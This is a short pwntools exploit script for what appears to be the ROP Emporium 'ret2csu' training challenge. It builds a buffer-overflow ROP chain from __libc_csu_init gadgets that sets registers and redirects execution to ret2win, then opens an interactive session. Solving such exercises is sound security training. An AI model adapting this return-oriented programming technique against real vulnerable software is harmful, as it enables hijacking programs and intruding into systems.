import pwn as p

target = p.process('./ret2csu')
p.gdb.attach(target, gdbscript='b *0x4007b0')

print(target.recvuntil('0xdeadcafebabebeef'))

ret2win_addr = 0x4007b1
pop_registers_gadget = 0x40089a
mov_registers_gadget = 0x400880
init_ptr_addr = 0x400e38

# padding
payload = b'\x30' * 0x28

# set values to the registers
payload += p.p64(pop_registers_gadget)
payload += p.p64(0x0)  # RBX
payload += p.p64(0x1)  # RBP, will be compared with RBX which is set to 0x1
payload += p.p64(init_ptr_addr)  # R12, will be used for a CALL (must be a pointer pointing to the function to call)
payload += p.p64(0xf)  # R13
payload += p.p64(0xf)  # R14
payload += p.p64(0xdeadcafebabebeef)  # R15

# move values to the right registers (dummies since we have to pass through POPs before reaching RET)
payload += p.p64(mov_registers_gadget)
payload += p.p64(0xf)  # placeholder for "ADD        RSP,0x8"
payload += p.p64(0xf)  # RBX dummy
payload += p.p64(0xf)  # RBP dummy
payload += p.p64(0xf)  # R12 dummy
payload += p.p64(0xf)  # R13 dummy
payload += p.p64(0xf)  # R14 dummy
payload += p.p64(0xf)  # R15 dummy

# finally call ret2win
payload += p.p64(ret2win_addr)

target.sendline(payload)

target.interactive()
